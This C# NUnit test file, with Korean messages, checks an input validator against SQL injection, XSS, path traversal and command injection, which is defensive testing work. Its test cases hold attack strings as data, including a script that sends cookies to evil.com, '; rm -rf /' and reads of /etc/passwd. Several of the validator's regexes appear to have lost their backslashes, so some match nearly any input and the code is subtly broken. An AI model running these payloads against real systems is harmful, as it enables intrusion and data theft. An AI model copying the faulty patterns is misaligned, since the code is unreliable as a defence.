// Tests/TestInputValidation.cs
using NUnit.Framework;
using System;
using System.Text.RegularExpressions;
using System.Collections.Generic;
using System.Web;

[TestFixture]
public class TestInputValidation
{
    private InputValidator _validator;

    [SetUp]
    public void Setup()
    {
        _validator = new InputValidator();
    }

    #region SQL Injection Tests

    [Test]
    [TestCase("' OR '1'='1")]
    [TestCase("'; DROP TABLE Users;--")]
    [TestCase("' UNION SELECT * FROM Users--")]
    [TestCase("admin'--")]
    [TestCase("1; DELETE FROM Users")]
    [TestCase("' OR 1=1--")]
    [TestCase("'; EXEC xp_cmdshell('dir');--")]
    [TestCase("' AND '1'='1")]
    [TestCase("1' ORDER BY 1--")]
    [TestCase("' UNION ALL SELECT NULL,NULL,NULL--")]
    public void TestForSQLInjection_ShouldDetectAndBlock(string maliciousInput)
    {
        var result = _validator.ValidateInput(maliciousInput);
        
        Assert.IsFalse(result.IsValid, $"SQL 인젝션이 감지되어야 합니다: {maliciousInput}");
        Assert.AreEqual(ThreatType.SqlInjection, result.DetectedThreat);
    }

    [Test]
    [TestCase("normaluser")]
    [TestCase("user_123")]
    [TestCase("JohnDoe99")]
    public void TestForSQLInjection_ShouldAllowValidInput(string validInput)
    {
        var result = _validator.ValidateInput(validInput);
        
        Assert.IsTrue(result.IsValid, $"유효한 입력이 차단됨: {validInput}");
    }

    #endregion

    #region XSS Tests

    [Test]
    [TestCase("<script>alert('XSS')</script>")]
    [TestCase("<img src=x onerror=alert('XSS')>")]
    [TestCase("javascript:alert('XSS')")]
    [TestCase("<svg onload=alert('XSS')>")]
    [TestCase("<body onload=alert('XSS')>")]
    [TestCase("<iframe src='javascript:alert(1)'>")]
    [TestCase("<div onclick=alert('XSS')>Click me</div>")]
    [TestCase("<input onfocus=alert('XSS') autofocus>")]
    [TestCase("<a href='javascript:void(0)' onclick='alert(1)'>Link</a>")]
    [TestCase("<script>document.location='http://evil.com/steal?c='+document.cookie</script>")]
    public void TestForXSS_ShouldDetectAndBlock(string maliciousInput)
    {
        var result = _validator.ValidateInput(maliciousInput);
        
        Assert.IsFalse(result.IsValid, $"XSS 공격이 감지되어야 합니다: {maliciousInput}");
        Assert.AreEqual(ThreatType.Xss, result.DetectedThreat);
    }

    [Test]
    public void TestForXSS_HtmlEncodingShouldWork()
    {
        string maliciousInput = "<script>alert('XSS')</script>";
        string sanitized = _validator.SanitizeHtml(maliciousInput);
        
        Assert.IsFalse(sanitized.Contains("<script>"), "스크립트 태그가 인코딩되어야 합니다.");
        Assert.IsTrue(sanitized.Contains("&lt;script&gt;"), "HTML 엔티티로 인코딩되어야 합니다.");
    }

    #endregion

    #region Username Validation Tests

    [Test]
    [TestCase("ab", false, "3자 미만")]
    [TestCase("abc", true, "최소 3자")]
    [TestCase("a", false, "1자")]
    [TestCase("", false, "빈 문자열")]
    [TestCase("abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyz", false, "50자 초과")]
    [TestCase("valid_user123", true, "유효한 사용자명")]
    [TestCase("user@name", false, "특수문자 @")]
    [TestCase("user name", false, "공백 포함")]
    [TestCase("user<script>", false, "스크립트 포함")]
    [TestCase("user'--", false, "SQL 인젝션")]
    public void TestUsernameValidation(string username, bool expectedValid, string description)
    {
        var result = _validator.ValidateUsername(username);
        
        Assert.AreEqual(expectedValid, result.IsValid, $"테스트 실패 ({description}): {username}");
    }

    #endregion

    #region Email Validation Tests

    [Test]
    [TestCase("test@example.com", true, "유효한 이메일")]
    [TestCase("user.name@domain.co.kr", true, "한국 도메인")]
    [TestCase("invalid-email", false, "@ 없음")]
    [TestCase("@nodomain.com", false, "로컬 파트 없음")]
    [TestCase("test@.com", false, "도메인 없음")]
    [TestCase("test@domain", false, "TLD 없음")]
    [TestCase("test'--@evil.com", false, "SQL 인젝션 시도")]
    [TestCase("<script>@xss.com", false, "XSS 시도")]
    [TestCase("", false, "빈 문자열")]
    public void TestEmailValidation(string email, bool expectedValid, string description)
    {
        var result = _validator.ValidateEmail(email);
        
        Assert.AreEqual(expectedValid, result.IsValid, $"테스트 실패 ({description}): {email}");
    }

    #endregion

    #region Path Traversal Tests

    [Test]
    [TestCase("../../../etc/passwd")]
    [TestCase("..\\..\\..\\windows\\system32")]
    [TestCase("....//....//etc/passwd")]
    [TestCase("/etc/passwd%00.jpg")]
    public void TestForPathTraversal_ShouldDetectAndBlock(string maliciousPath)
    {
        var result = _validator.ValidateInput(maliciousPath);
        
        Assert.IsFalse(result.IsValid, $"경로 탐색 공격이 감지되어야 합니다: {maliciousPath}");
        Assert.AreEqual(ThreatType.PathTraversal, result.DetectedThreat);
    }

    #endregion

    #region Command Injection Tests

    [Test]
    [TestCase("; rm -rf /")]
    [TestCase("| cat /etc/passwd")]
    [TestCase("`whoami`")]
    [TestCase("$(cat /etc/passwd)")]
    [TestCase("& net user")]
    public void TestForCommandInjection_ShouldDetectAndBlock(string maliciousInput)
    {
        var result = _validator.ValidateInput(maliciousInput);
        
        Assert.IsFalse(result.IsValid, $"명령어 인젝션이 감지되어야 합니다: {maliciousInput}");
        Assert.AreEqual(ThreatType.CommandInjection, result.DetectedThreat);
    }

    #endregion

    #region Sanitization Tests

    [Test]
    public void TestSanitization_ShouldRemoveDangerousCharacters()
    {
        string input = "Hello<script>World";
        string sanitized = _validator.SanitizeInput(input);
        
        Assert.IsFalse(sanitized.Contains("<"), "위험 문자가 제거되어야 합니다.");
        Assert.IsFalse(sanitized.Contains(">"), "위험 문자가 제거되어야 합니다.");
    }

    [Test]
    public void TestSanitization_ShouldTrimWhitespace()
    {
        string input = "   username   ";
        string sanitized = _validator.SanitizeInput(input);
        
        Assert.AreEqual("username", sanitized, "앞뒤 공백이 제거되어야 합니다.");
    }

    #endregion
}

#region Supporting Classes

public enum ThreatType
{
    None,
    SqlInjection,
    Xss,
    PathTraversal,
    CommandInjection,
    InvalidFormat
}

public class ValidationResult
{
    public bool IsValid { get; set; }
    public ThreatType DetectedThreat { get; set; }
    public string Message { get; set; }

    public static ValidationResult Success() => new ValidationResult { IsValid = true, DetectedThreat = ThreatType.None };
    public static ValidationResult Failure(ThreatType threat, string message) => new ValidationResult { IsValid = false, DetectedThreat = threat, Message = message };
}

public class InputValidator
{
    // SQL 인젝션 패턴
    private static readonly string[] SqlInjectionPatterns = new[]
    {
        @"('|"")s*(or|and)s*('|""|d|w+s*=)",
        @"(union|select|insert|update|delete|drop|truncate|exec|execute)s",
        @";s*(drop|delete|update|insert|exec)",
        @"'s*ors*'?d",
        @"--s*$"
    };

    // XSS 패턴
    private static readonly string[] XssPatterns = new[]
    {
        @"<script[^>]*>",
        @"</script>",
        @"javascripts*:",
        @"onw+s*=",
        @"<iframe",
        @"<object",
        @"<embed",
        @"<svg[^>]*on",
        @"<img[^>]*on"
    };

    // 경로 탐색 패턴
    private static readonly string[] PathTraversalPatterns = new[]
    {
        @"\.\.[\\/]",
        @"%2e%2e[\\/]",
        @"%00"
    };

    // 명령어 인젝션 패턴
    private static readonly string[] CommandInjectionPatterns = new[]
    {
        @";s*[a-z]",
        @"|s*[a-z]",
        @"`[^`]*`",
        @"$([^)]*)",
        @"&s*[a-z]"
    };

    public ValidationResult ValidateInput(string input)
    {
        if (string.IsNullOrEmpty(input)) return ValidationResult.Failure(ThreatType.InvalidFormat, "입력값이 비어있습니다.");

        // SQL 인젝션 검사
        foreach (var pattern in SqlInjectionPatterns)
        {
            if (Regex.IsMatch(input, pattern, RegexOptions.IgnoreCase))
                return ValidationResult.Failure(ThreatType.SqlInjection, "SQL 인젝션 패턴 감지");
        }

        // XSS 검사
        foreach (var pattern in XssPatterns)
        {
            if (Regex.IsMatch(input, pattern, RegexOptions.IgnoreCase))
                return ValidationResult.Failure(ThreatType.Xss, "XSS 패턴 감지");
        }

        // 경로 탐색 검사
        foreach (var pattern in PathTraversalPatterns)
        {
            if (Regex.IsMatch(input, pattern, RegexOptions.IgnoreCase))
                return ValidationResult.Failure(ThreatType.PathTraversal, "경로 탐색 패턴 감지");
        }

        // 명령어 인젝션 검사
        foreach (var pattern in CommandInjectionPatterns)
        {
            if (Regex.IsMatch(input, pattern, RegexOptions.IgnoreCase))
                return ValidationResult.Failure(ThreatType.CommandInjection, "명령어 인젝션 패턴 감지");
        }

        return ValidationResult.Success();
    }

    public ValidationResult ValidateUsername(string username)
    {
        if (string.IsNullOrEmpty(username))
            return ValidationResult.Failure(ThreatType.InvalidFormat, "사용자명이 비어있습니다.");

        if (username.Length < 3 || username.Length > 50)
            return ValidationResult.Failure(ThreatType.InvalidFormat, "사용자명은 3-50자여야 합니다.");

        if (!Regex.IsMatch(username, @"^[a-zA-Z0-9_]+$"))
            return ValidationResult.Failure(ThreatType.InvalidFormat, "영문, 숫자, 언더스코어만 허용됩니다.");

        // 추가 보안 검사
        var securityCheck = ValidateInput(username);
        if (!securityCheck.IsValid) return securityCheck;

        return ValidationResult.Success();
    }

    public ValidationResult ValidateEmail(string email)
    {
        if (string.IsNullOrEmpty(email))
            return ValidationResult.Failure(ThreatType.InvalidFormat, "이메일이 비어있습니다.");

        if (email.Length > 100)
            return ValidationResult.Failure(ThreatType.InvalidFormat, "이메일은 100자 이하여야 합니다.");

        if (!Regex.IsMatch(email, @"^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$"))
            return ValidationResult.Failure(ThreatType.InvalidFormat, "유효한 이메일 형식이 아닙니다.");

        // 추가 보안 검사
        var securityCheck = ValidateInput(email);
        if (!securityCheck.IsValid) return securityCheck;

        return ValidationResult.Success();
    }

    public string SanitizeInput(string input)
    {
        if (string.IsNullOrEmpty(input)) return string.Empty;
        
        // 위험 문자 제거
        string sanitized = Regex.Replace(input, @"[<>'"";\\`${}|&]", "");
        return sanitized.Trim();
    }

    public string SanitizeHtml(string input)
    {
        if (string.IsNullOrEmpty(input)) return string.Empty;
        return HttpUtility.HtmlEncode(input);
    }
}

#endregion
